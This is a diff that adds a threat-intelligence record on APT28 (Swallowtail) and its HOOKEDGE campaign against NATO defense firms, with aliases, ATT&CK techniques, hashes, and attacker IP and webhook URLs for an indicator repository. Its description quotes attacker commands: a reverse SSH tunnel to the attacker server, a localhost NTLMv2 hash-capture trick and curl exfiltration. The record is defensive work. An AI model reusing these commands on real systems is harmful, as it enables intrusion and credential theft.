@@ -1,0 +1,148 @@
+author: APTWatch Curator
+source: https://www.security.com/threat-intelligence/swallowtail-russia-nato-targets
+source_name: "Symantec Threat Hunter Team — Swallowtail: Russian Espionage Group Targets Defense Firms in Two NATO Countries (2026-10-20)"
+
+apt_groups:
+  - APT28
+  - Forest Blizzard
+  - Fancy Bear
+  - Swallowtail
+  - BlueDelta
+  - Sofacy
+  - Sednit
+  - Pawn Storm
+  - STRONTIUM
+  - GRU Unit 26165
+
+description: >
+  Attribution: Symantec Threat Hunter Team (Broadcom) attributes this activity to Swallowtail,
+  its name for APT28 / Fancy Bear / Forest Blizzard (GRU Unit 26165), via use of the HOOKEDGE
+  backdoor. HOOKEDGE was first documented by Recorded Future Insikt Group on 2026-08-27 under the
+  BlueDelta name (moderate-confidence attribution based on code and tradecraft overlap with
+  HEADLACE) and by Lab52/S2 Grupo on 2026-02-13 as Operation MacroMaze. Symantec's report extends
+  the public record with post-compromise tradecraft: two credential-theft techniques, a persistent
+  reverse SSH tunnel and a previously undocumented reflective loader (ld.exe). Confidence: high
+  (three independent vendors converge on APT28; US government attribution of APT28 to GRU per
+  CISA AA25-141A).
+
+  Victimology: organizations in two unnamed NATO member states — a law enforcement agency, a naval
+  shipbuilder and a manufacturer of military aircraft engines. The detailed intrusion is the naval
+  shipbuilder: initial access on 2026-07-24 via a macro-enabled Word document opened from the
+  Outlook attachment cache (T1566.001, T1204.002, T1059.005); hands-on-keyboard activity
+  2026-07-27 to 2026-07-31; HOOKEDGE artefacts still present late August; last VBS launcher
+  sighting 2026-09-24. Earlier HOOKEDGE waves (Recorded Future) hit government/diplomatic targets
+  in Romania, Spain and Turkiye between 2025-09-26 and 2026-04.
+
+  TTPs: obfuscated VBA AutoOpen drops a VBS launcher, HTM/XHTML exfiltration wrappers and a batch
+  script (T1027.013, T1140); batch kills msedge.exe and relaunches a 1x1 pixel off-screen Edge
+  window with a base64 data: URL (T1564.003, T1218) that fetches tasking from webhook.site and
+  saves the response as a .cmd (T1583.006, T1102.002, T1071.001, T1105); persistence via
+  scheduled task (T1053.005); recon batch probing dl.dropboxusercontent.com, accounts.google.com,
+  login.microsoftonline.com, mega.nz, example.com and a bare IP 23.220.75.245 to test outbound
+  channels (T1016, T1082, T1057, T1083, T1033) — 23.220.75.245 is deliberately omitted from the
+  IOC lists as it is an egress-connectivity probe target, not attacker infrastructure. Second
+  stage (2026-07-27) abandons webhook.site for dedicated infrastructure 185.82.218.119:443 with
+  per-session UUID paths (53379b62-... installer/scheduled-task id, 5b73dc69-... C2 session id);
+  tasks POST an ack, run the operator command, upload output with curl --data-binary and delete
+  temp files (T1041, T1070.004). Credential theft #1: an SSH private key is pushed to
+  C:\ProgramData\Adobe\id_rsa, ACLs adjusted with icacls/cacls, then the built-in Windows OpenSSH
+  client opens a backgrounded reverse tunnel ssh -i id_rsa -p 80 root@185.82.218.119 -R
+  185.82.218.119:48097 -Nf with StrictHostKeyChecking=no and legacy ssh-rsa forced (T1572,
+  T1021.004, T1090). Credential theft #2: a self-contained PowerShell HttpListener on
+  http://localhost:8080/ plus net use f: \\localhost@8080\c$ forces the host to authenticate to
+  itself and captures NTLMv2 challenge/response pairs (up to four) for offline cracking or relay
+  (T1557.001 / T1187, T1059.001). Discovery: whoami /all, net groups, net group Administrators,
+  systeminfo, tasklist, wmic qfe, internal DNS lookups and pings including a probable mail server
+  (T1069.002, T1018, T1087). Reflective loader ld.exe (SHA-256
+  f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff) takes a 32-hex key and an
+  encrypted file as arguments, decrypts in memory (plaintext starts with marker ADSA 0x41534441)
+  and calls exported function ExecuteLoader; observed command line C:\ProgramData\ld.exe
+  DE063CF3F2E2A83E7B1A277C052A340E C:\ProgramData\Events.dat; Events.dat was not recovered
+  (T1620, T1027). Tunnel torn down 2026-07-28 with taskkill /f /t /im ssh.exe.
+
+  Infrastructure roles (first seen per Symantec timeline): 185.82.218.119 — second-stage
+  tasking/exfiltration server (HTTPS on 443, per-UUID paths) and SSH tunnel endpoint (SSH on port
+  80), active from 2026-07-27, last operator tasking 2026-07-31. Enrichment 2026-10-23: AS59729
+  (ITLDC / ITL-BG, Route 95 LLC), network 185.82.216.0/22, geo Bulgaria, hosting/data-center;
+  Shodan shows only port 22 OpenSSH 7.4, hostname linux.server; VirusTotal 6 malicious verdicts;
+  AbuseIPDB 0 reports; DShield historic blocklist.de entries 2021-10 (unrelated prior abuse of the
+  same address). webhook.site endpoints: 890efd8d-6e9e-428a-bcf9-987745d71000 — first-stage
+  staging/tasking and canary (2026-07-24); 53379b62-8020-41cf-af57-effa6e1e8506 and
+  5b73dc69-d765-4440-a4d2-e9eb33283eb9 — second-stage identifiers reused as paths on the
+  dedicated server; d828b9fc-5435-4b1c-881f-d6350c11d0b6 and ca3c058e-3c88-449b-8299-822cd5d5e17c
+  — additional endpoints listed by Symantec without a stated role. webhook.site is a legitimate
+  service; only the listed UUID paths are malicious.
+
+  SHA-256 file indicators published by Symantec, no hash field in this schema, recorded here for
+  the curator: Hookedge droppers (macro-enabled Word documents) —
+  4a43aacffc2d8d76f7abac729238779b6c99b10ee09f54c2cea1654a91561303,
+  e068794cf43e381b26c82d746cca107b9f84327a2a8308d5b87ea5529963c4c8,
+  e8be50171436550e1edd8b4946d2adc0870e97465f67526ea252bff0815abcbe,
+  60ef547ebd2f4252e286db762980481b0da23dcd2c84465509735544c0a9c2b3,
+  1bb1b27e1695c726c7c1d3d4935f9318afc6f5fd9015d7cf3890f0eb7bf8d47e,
+  a3b44405112e6364447e5d96630edfabcf81e5ad37d690c3ebc73770d62aeabd,
+  6678049918dda2d5859de0a95e0573fec9496c62bbe72967ae0d3deeb5bda68f,
+  c2c9187033d22d7944ea9298461a0ac693ef2774b4ce08b0955d2aba3646fb44 (also in the Recorded Future
+  2026-08-27 appendix),
+  ea525336b787c2fd3dbc4b3e9a3a78f71004e1bd43e2e1ed953edad51118cb72,
+  5709e5e1496410d4b9ac5a3bd8be3ec4595f881b4865ebf6e490784b56105645,
+  49e276498fc4e7d65ebf9fa2acf64ec2a0c25e75ac621cd6a203d64fb75aa495,
+  39d21c1b8ab2f08c75a1cb7d18433a8b207c71ec1d266bb049b54b7eaf01d67b,
+  1bff55104206d3f55cd72ca58ffecd2fa620a428c5a3c6987d3c4cc68285d335,
+  e94402a9886d4433ccad0ced0cd4f22d055d1f0f7e4155dbec992433eb94e00c,
+  2fceca3460a35eea2b21c47d73c27c27edae95d2ae29ffb4ec2222d1a223b4bd,
+  68613e232d0893e61ad29906daee2312bd4c4e940f4d0c9e702e7c35a256d0f7,
+  a92413d4951a28822ec85e5c0d1948d4160b91388c5f3d86504611fc286a4d13.
+  Hookedge VBS launchers — 063930af6a4aad06d8f8aab43226bf6dcddd2c79aa505894ee95876cf9254543,
+  d74c65e6d35d3b2a80686f059590f919316ecaf4ed539192e904d675ba5c7a40,
+  aafbc096e20f259df9166f837d0baf7333f177e6f383ca7cb9215936ecbe7f5e (VirusTotal 3/57, 100-byte
+  VBA, seen under GUID filenames cf25f91c-..., 01d6a811-..., 4ef62d6a-... which match Recorded
+  Future webhook UUIDs — same generic launcher reused across the campaign; OTX 5 pulses tagged
+  apt28/hookedge/swallowtail; APTWatch hash lookup 0 results, query_id qry_01M5MFYYHCHQ4PHHS4J1WG17AS).
+  ld.exe reflective loader — f1cc91e7427a22027f65d31bbee19c54b602d08d7d93e4745b9cea59fa8132ff
+  (APTWatch 0 results). Microsoft Defender detections named in the related Defender TA report:
+  Trojan:Win32/Sulunch, Trojan:Win32/Ravartar, TrojanDownloader:O97M/DownloadExec.
+
+  Deduplication / refresh notes: APTWatch batch lookup qry_01M5MFZ7ADDYM6K7WA2XGJE669 (2026-10-23)
+  shows that 185.82.218.119 and all five Symantec webhook.site URLs are ALREADY attributed in the
+  APTWatch database to actor "APT28 HOOKEDGE / Operation MacroMaze" with first_seen 2026-10-20
+  (confidence high, evidence osint_attribution), although they are not yet present in the
+  repository iocs/ipv4.txt and iocs/urls.txt snapshot of 2026-10-19 — they are therefore kept in
+  the lists below so the repository catches up, and the maintainer should merge rather than
+  double-insert. The 30 webhook.site URLs from the Recorded Future appendix and the 10 from Lab52
+  are likewise already in the database under the same actor (first_seen 2026-08-31, batch
+  qry_01M5MG0EVCGHBZQFSVWS957BDG) and are intentionally omitted here; refresh their last_seen to
+  2026-08-27 (Recorded Future publication). Curator suggestions: (1) link or merge the
+  "APT28 HOOKEDGE / Operation MacroMaze" campaign actor with the canonical Forest Blizzard / APT28
+  actor so alias lookups resolve; (2) add "Swallowtail" to the Forest Blizzard alias list;
+  (3) extend last_seen of 185.82.218.119 to 2026-07-31 (last operator tasking) with lifecycle
+  active given the 2026-09-24 launcher sighting.
+
+  Companion sources: Recorded Future Insikt Group, "BlueDelta Targets Defense and Diplomacy with
+  HOOKEDGE", 2026-08-27, https://www.recordedfuture.com/research/bluedelta-targets-with-hookedge
+  (PDF https://assets.recordedfuture.com/insikt-report-pdfs/2026/cta-ru-2026-0827.pdf; MITRE
+  mapping T1583.006, T1059.003, T1059.005, T1204.002, T1053.005, T1027.013, T1070.004, T1140,
+  T1083, T1074.001, T1071.001, T1105, T1041, T1567.004); Lab52, "Operation MacroMaze: new APT28
+  campaign using basic tooling and legit infrastructure", 2026-02-13,
+  https://lab52.io/blog/operation-macromaze-new-apt28-campaign-using-basic-tooling-and-legit-infrastructure/;
+  The Hacker News, 2026-10-20, https://thehackernews.com/2026/10/russian-apt28-breaches-nato-naval.html;
+  CISA AA25-141A (GRU Unit 26165 targeting Western logistics and technology companies),
+  https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a; prior HEADLACE lineage —
+  CERT Polska 2024-05 https://cert.pl/en/posts/2024/05/apt28-campaign/ and CERT-UA
+  https://cert.gov.ua/article/5702579.
+
+  Related Defender TA report: OSINT Profile: Swallowtail: Russian Espionage Group Targets Defense
+  Firms in Two NATO Countries, GUID 7db27362-c471-4897-ba21-6096ec27b03b, Report Type Tools &
+  techniques, published and updated 2026-10-22. Flag originated from the analyse-ms-threat-analytics
+  skill run of 2026-10-23, russia_nexus keyword match (Russian) with Swallowtail alias confirmed by
+  the curator as APT28 / Forest Blizzard, category russia_state_apt.
+
+ipv4:
+  - 185.82.218.119
+
+urls:
+  - https://webhook.site/890efd8d-6e9e-428a-bcf9-987745d71000
+  - https://webhook.site/53379b62-8020-41cf-af57-effa6e1e8506
+  - https://webhook.site/5b73dc69-d765-4440-a4d2-e9eb33283eb9
+  - https://webhook.site/d828b9fc-5435-4b1c-881f-d6350c11d0b6
+  - https://webhook.site/ca3c058e-3c88-449b-8299-822cd5d5e17c
